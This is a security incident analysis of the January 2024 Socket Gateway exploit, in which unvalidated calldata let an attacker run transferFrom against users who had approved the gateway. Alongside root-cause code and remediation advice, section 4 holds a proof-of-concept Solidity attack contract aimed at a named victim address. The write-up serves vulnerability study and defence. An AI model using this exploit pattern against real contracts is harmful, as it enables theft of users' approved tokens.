# Socket Gateway — Arbitrary Call via Malicious Route Analysis

| Field | Details |
|------|------|
| **Date** | 2024-01-12 |
| **Protocol** | Socket Gateway |
| **Chain** | Ethereum |
| **Loss** | ~$3,300,000 |
| **Attacker** | [0x50DF5a22](https://etherscan.io/address/0x50DF5a2217588772471B84aDBbe4194A2Ed39066) |
| **Attack Contract** | [0xf2D5951b](https://etherscan.io/address/0xf2D5951bB0A4d14BdcC37b66f919f9A1009C05d1) |
| **Vulnerable Contract** | [VulnRoute 0x3a23F943](https://etherscan.io/address/0x3a23F943181408EAC424116Af7b7790c94Cb97a5) |
| **Root Cause** | The `executeRoute()` function passes user-supplied calldata to external token contracts without validation when invoking `performAction()` on a route contract, enabling arbitrary `transferFrom` execution |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/SocketGateway_exp.sol) |

---

## 1. Vulnerability Overview

Socket Gateway is a cross-chain bridge/DEX aggregation protocol that supports various route contracts. The `performAction()` function of the vulnerable route (#406) directly calls an ERC20 token contract with the `swapExtraData` parameter. The attacker encoded `transferFrom(victim, attacker, balance)` into `swapExtraData`, gaining access to approximately $70 million in user funds that had approved Socket Gateway.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: swapExtraData is passed to an external call without validation
contract VulnRoute {
    function performAction(
        address fromToken,
        address toToken,
        uint256 amount,
        address receiverAddress,
        bytes calldata swapExtraData  // attacker-controlled
    ) external payable returns (uint256) {
        // Directly calls fromToken with swapExtraData — transferFrom can be abused
        (bool success,) = fromToken.call(swapExtraData);
        require(success);
    }
}

// ✅ Safe code: only whitelisted function selectors are executed
contract SafeRoute {
    bytes4 constant SWAP_SELECTOR = bytes4(keccak256("swap(...)"));

    function performAction(..., bytes calldata swapExtraData) external payable returns (uint256) {
        bytes4 selector = bytes4(swapExtraData[:4]);
        // Block dangerous selectors such as transferFrom, transfer
        require(selector == SWAP_SELECTOR, "forbidden selector");
        (bool success,) = fromToken.call(swapExtraData);
        require(success);
    }
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: BaseController.sol
    function _executeRoute(  // ❌ vulnerability
        uint32 routeId,
        bytes memory data
    ) internal returns (bytes memory) {
        (bool success, bytes memory result) = socketRoute
            .getRoute(routeId)
            .delegatecall(data);

        if (!success) {
            assembly {
                revert(add(result, 32), mload(result))
            }
        }

        return result;
    }
```

```solidity
// File: FeesTakerController.sol
        //call bridge function (executeRoute for the swapRequestData)
        return _executeRoute(ftsRequest.routeId, ftsRequest.swapRequestData);  // ❌ vulnerability
    }

    /**
     * @notice function to deduct-fees to fees-taker address on source-chain and bridge amount to destinationChain
     * @dev ensure correct function selector is used to generate transaction-data for bridgeRequest
     * @param ftbRequest feesTakerBridgeRequest object generated either off-chain or the calling contract using
     *                   the function-selector FEES_TAKER_BRIDGE_FUNCTION_SELECTOR
     * @return output bytes from the bridge operation (last operation in the composed actions)
     */
    function takeFeesAndBridge(
        ISocketRequest.FeesTakerBridgeRequest calldata ftbRequest
    ) external payable returns (bytes memory) {
```

```solidity
// File: RefuelSwapAndBridgeController.sol
        address _socketGatewayAddress
    ) BaseController(_socketGatewayAddress) {}

    /**
     * @notice function to handle refuel followed by Swap and Bridge actions
     * @notice This method is payable because the caller is doing token transfer and briding operation
     * @param rsbRequest Request with data to execute refuel followed by swap and bridge
     * @return output data from bridging operation
     */
    function refuelAndSwapAndBridge(
        ISocketRequest.RefuelSwapBridgeRequest calldata rsbRequest
    ) public payable returns (bytes memory) {
        _executeRoute(rsbRequest.refuelRouteId, rsbRequest.refuelData);  // ❌ vulnerability

        // refuel is also a bridging activity via refuel-route-implementation
        bytes memory swapResponseData = _executeRoute(
            rsbRequest.swapRouteId,
            rsbRequest.swapData
        );

        uint256 swapAmount = abi.decode(swapResponseData, (uint256));

        //sequence of arguments for implData: amount, token, data
        // Bridging the swapAmount received in the preceeding step
        bytes memory bridgeImpldata = abi.encodeWithSelector(
            BRIDGE_AFTER_SWAP_SELECTOR,
            swapAmount,
            rsbRequest.bridgeData
        );

        return _executeRoute(rsbRequest.bridgeRouteId, bridgeImpldata);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Check victim (0x7d03149A) USDC balance / approval
  │
  ├─→ [2] Construct swapExtraData:
  │         └─ Encode transferFrom(victim, attacker, victimUSDCBalance)
  │
  ├─→ [3] Call ISocketGateway.executeRoute(406, routeData)
  │         └─ routeData contains malicious swapExtraData
  │
  ├─→ [4] VulnRoute.performAction() executes
  │         └─ USDC.call(transferFrom malicious calldata)
  │
  ├─→ [5] Victim USDC transferred to attacker (~3.3M)
  │
  └─→ [6] Repeated across multiple victims
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ISocketGateway {
    function executeRoute(uint32 routeId, bytes calldata routeData) external payable;
}

contract AttackContract {
    ISocketGateway constant gateway = ISocketGateway(0xc47b...);
    address constant USDC   = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant victim = 0x7d03149A2843E4200f07e858d6c0216806Ca4242;

    function testExploit() external {
        uint256 victimBalance = IERC20(USDC).balanceOf(victim);

        // [1] Encode transferFrom calldata
        bytes memory maliciousData = abi.encodeWithSelector(
            IERC20.transferFrom.selector,
            victim,
            address(this),
            victimBalance
        );

        // [2] Construct routeData — inject malicious calldata into swapExtraData
        bytes memory routeData = abi.encode(
            USDC,       // fromToken = USDC contract address
            USDC,       // toToken
            victimBalance,
            address(this),
            maliciousData  // swapExtraData = malicious transferFrom call
        );

        // [3] Call executeRoute — execute route 406
        gateway.executeRoute(406, routeData);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary External Call |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (route parameter manipulation) |
| **DApp Category** | Cross-chain DEX Aggregator |
| **Impact** | Large-scale theft of approved user tokens |

## 6. Remediation Recommendations

1. **Selector whitelist**: Validate the first 4 bytes (function selector) of `swapExtraData` — block `transferFrom`, `transfer`
2. **Token contract restriction**: Prohibit direct calldata forwarding when `fromToken` is an ERC20 token
3. **Route isolation**: Execute each route in a separate context to prevent gateway privilege abuse
4. **User education**: Discourage unlimited max approvals; advise users to approve only the required amount

## 7. Lessons Learned

- The same "arbitrary external call" pattern seen in BMI Zapper and LQDX also manifested in Socket Gateway.
- Cross-chain aggregators are particularly susceptible to this type of attack due to their nature of supporting diverse routes.
- Within January 2024 alone, tens of millions of dollars were stolen via similar patterns.